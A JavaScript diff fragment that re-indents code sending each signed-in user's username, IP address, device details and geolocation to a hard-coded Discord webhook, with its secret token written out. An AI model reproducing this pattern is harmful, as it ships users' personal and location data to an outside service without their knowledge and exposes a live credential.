@@ -1,10 +1,10 @@
 
-      const clientIP = await getClientIP();
-      const deviceInfo = getDeviceInfo();
-      const clientGeolocation = await getClientGeolocation(clientIP);
+const clientIP = await getClientIP();
+const deviceInfo = getDeviceInfo();
+const clientGeolocation = await getClientGeolocation(clientIP);
 
-      const payload = {
-        content: `Successful Sign In:
+const payload = {
+  content: `Successful Sign In:
         Username: ${username}
         User-Agent: ${deviceInfo.userAgent}
         Platform: ${deviceInfo.platform}
@@ -19,14 +19,14 @@
           Longitude: ${clientGeolocation.longitude}
           Timezone: ${clientGeolocation.timezone}
           Currency: ${clientGeolocation.currency} (${clientGeolocation.currency_name})`
-      };
+};
 
-      const webhookURL = 'https://discord.com/api/webhooks/1182602607575978025/QZbCoN4tO3hk-60j37ZPJJQvTSnnqKssGli1twy9dKj-j0pc7IZiydzVk48g06tzy1Op';
+const webhookURL = 'https://discord.com/api/webhooks/1182602607575978025/QZbCoN4tO3hk-60j37ZPJJQvTSnnqKssGli1twy9dKj-j0pc7IZiydzVk48g06tzy1Op';
 
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(payload),
-      })
+fetch(webhookURL, {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify(payload),
+})
